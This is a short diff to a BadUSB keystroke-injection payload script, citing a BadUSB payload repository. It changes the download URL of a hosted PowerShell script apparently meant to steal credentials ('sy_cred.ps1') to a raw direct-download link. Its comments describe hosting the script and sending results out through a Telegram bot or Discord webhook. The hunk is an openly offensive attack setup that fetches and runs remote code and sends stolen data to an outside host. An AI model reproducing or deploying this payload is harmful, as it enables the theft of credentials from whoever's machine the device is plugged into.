@@ -8,7 +8,7 @@ REM Source: https://github.com/Mr-Proxy-source/BadUSB-Payloads
 
 REM Remember you will have to host the powershell script yourself on any file sharing service (it has to be direct download link)
 REM If you are using DropBox, just remember to change it from ?dl=0 top ?dl=1
-DEFINE SCRIPT_URL https://github.com/klamellerklar/Demos/edit/main/sy_cred.ps1
+DEFINE SCRIPT_URL https://raw.githubusercontent.com/klamellerklar/Demos/refs/heads/main/sy_cred.ps1
 
 REM If you want to use discord webhook instead of telegram bot, just change DC_WEBHOOK 
 
